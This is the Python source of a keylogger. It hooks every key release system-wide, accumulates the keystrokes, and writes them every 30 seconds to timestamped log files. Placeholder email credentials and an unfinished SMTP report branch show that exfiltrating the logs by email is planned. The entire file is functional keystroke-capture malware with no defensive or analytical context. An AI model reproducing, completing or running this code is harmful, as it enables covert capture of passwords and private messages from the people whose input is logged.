import keyboard
import smtplib      # Simple Mail Transfer Protocol library
from threading import Timer
from datetime import datetime


REPORT_TIMER = 30   # send log once per 30 seconds
LOG_ADDRESS = "email"
LOG_ADDRESS_PASSWD = "passwd"


class Keylogger:

    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""   # string containing recorded keystrokes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()


    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)  # start the keylogger
        self.report()   # initiate report process
        keyboard.wait() # block current thread


    def callback(self, event):
        key = event.name
        if len(key) > 1:
            if key == "space":
                key = " "
            elif key == "enter":
                key = "[ENTER]\n"
            elif key == "decimal":
                key = "."
            else: # spaces --> underscores
                key = key.replace(" ", "_")
                print(key)
                key = f"[{key.upper()}]"
                print(key)
        # log keystroke
        self.log += key


    def update_filename(self):
        # Filename named after time
        start = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"KEYLOG_{start}_{end}"


    def report_to_file(self):
        f = open(f"{self.filename}.txt", 'w')
        print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")


    def report(self):
        if self.log:
            # if log isn't empty
            self.end_dt = datetime.now()    # record end time when log is to be sent
            self.update_filename()
            if self.report_method == "email":
                print("-- TODO --")
            elif self.report_method == "file":
                self.report_to_file()
            print(f"[{self.filename}] ==> {self.log}")  # debugging
            self.start_dt = datetime.now()  # start time recorded when report has been made
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True     # when main thread dies, kill thread
        timer.start()



if __name__ == "__main__":  # if this program is run directly and not imported
    keylogger = Keylogger(interval=REPORT_TIMER, report_method="file")
    keylogger.start()






